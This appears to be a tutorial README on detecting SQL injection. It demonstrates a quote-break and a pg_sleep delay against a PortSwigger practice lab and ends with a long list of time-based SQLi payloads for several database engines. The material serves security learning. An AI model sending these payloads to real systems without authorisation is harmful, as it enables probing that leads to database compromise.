<h1>How The Heck Do I Detect A SQL Injection? - FOR INFORMATIONAL PURPOSES ONLY</h1>
To <mark>Detect</mark> SQL Injections we need to inject payloads via user input and monitor for changes in the web server's response. This change can be a difference in response content, server response times, or even out-of-band network interactions
in some cases.

<h2>What Do We Inject?</h2>

<img width="1138" height="422" alt="Detect-SQLi-Techniques" src="https://github.com/user-attachments/assets/ac99a451-02f3-4bf6-9c1f-8a7f9adbe6ea" />

<h1>Example Of SQL Injection Detection</h1>

Let's analyze a web server with a search functionality that allows users to filter their searches by using the 'category' parameter.

<h2>The SQL Query</h2>

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

<h2>Here's the URL when we want to view the 'Gifts' category</h2>

https://0ac700a4046e186080c4803500c300f3.web-security-academy.net/filter?category=Gifts

<img width="1909" height="703" alt="sqli-detection-regular-server-response" src="https://github.com/user-attachments/assets/24f5290a-47da-4f42-9706-49767ac39da8" />

<h2>Breaking The Backend SQL Query</h2>
Now let's attempt to break the backend SQL Query by injecting a single ' character into the category parameter

<h2>Heres the URL when we inject a ' character into the category parameter</h2>

https://0ac700a4046e186080c4803500c300f3.web-security-academy.net/filter?category=Gifts'

<img width="1907" height="695" alt="sqli-detection-broken-sql-query-with-single-quote" src="https://github.com/user-attachments/assets/c831c88b-3e1b-4794-81f0-d8b3e50526bd" />


<h2>Injecting A Time-Based SQLi Payload To Prove We Are Interacting With The Backend SQL Database</h2>

To prove our SQL Injection, I will try to cause a 10 second delay in the servers response.

<h2>Heres the URL when we inject our malicious payload to cause a 10 second delay in the response from the SQL Database</h2>

https://0ac700a4046e186080c4803500c300f3.web-security-academy.net/filter?category=Gifts';select+pg_sleep(10)--

Analyze the image and notice in the <mark>bottom right</mark> that the server response took 10 seconds to deliver to us. This proves that we are successfully interacting with the SQL Database via our injections into the category parameter.


<img width="1907" height="690" alt="sqli-detection-time-based-proof-of-concept" src="https://github.com/user-attachments/assets/4c216b94-8e8e-4f9a-b836-7499ef6e1c9a" />



<h1>Great SQL Injection Resources</h1>

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main

https://portswigger.net/web-security/sql-injection/cheat-sheet

https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli

https://portswigger.net/web-security/all-labs#sql-injection

<h1>Time-Based SQL Injection Detection Payloads</h1>

```
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
1'XOR(94120=if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(if(now()=sysdate(),sleep(5+5),0))OR'
if(1=1,sleep(10),0)/0'XOR(if(1=1,sleep(10),0))OR'
if(now()=sysdate(),sleep(10),0
(select*from(select(sleep(10)))a)
0'XOR(if(now()=sysdate(),sleep(6*2),0))XOR'Z
;waitfor delay '0:0:10' --
;waitfor delay '0:0:10' --
(select*from(select(sleep(10)))a)
select db from(select(sleep(10)))v
-sleep(10)
0'XOR(if(now()=sysdate(),sleep(10),0))OR'
1;SELECT IF((8303=8302),SLEEP(10),2356)#
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'|(if((now())like(sysdate()),sleep(10),0))|'Z
0'or(now()=sysdate()&&sleep(10))or'Z
1'XOR(select(1)from(select(sleep(10)))a)XOR'Z
XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
(select(0)from(select(sleep(10)))a)XOR'Z
(select db from(select(sleep(10)))a)--
0' or benchmark(20000000,sha1(1)) or 'z
(select 11 from pg_sleep(10))--
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
1'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
1'XOR(if(now()=sysdate(),sleep(10),0))XOR'x
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
(select 0 from(select(sleep(10)))a)XOR'Z
select id from (select(sleep(10)))a-- wxyw
select 4564 from pg_sleep(10)--
'XOR(if(2=2,sleep(10),0))a#
1' or sleep(10)#
(select*from(select(if(1=1,sleep(10),false)))a)#
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'
(select 0 from(select(sleep(10)))a)
desc, (select*from(select(sleep(10)))a)
-1' or 1=(select 1 from(select(sleep(10))a))a
```

<h1>To Be Continued</h1>


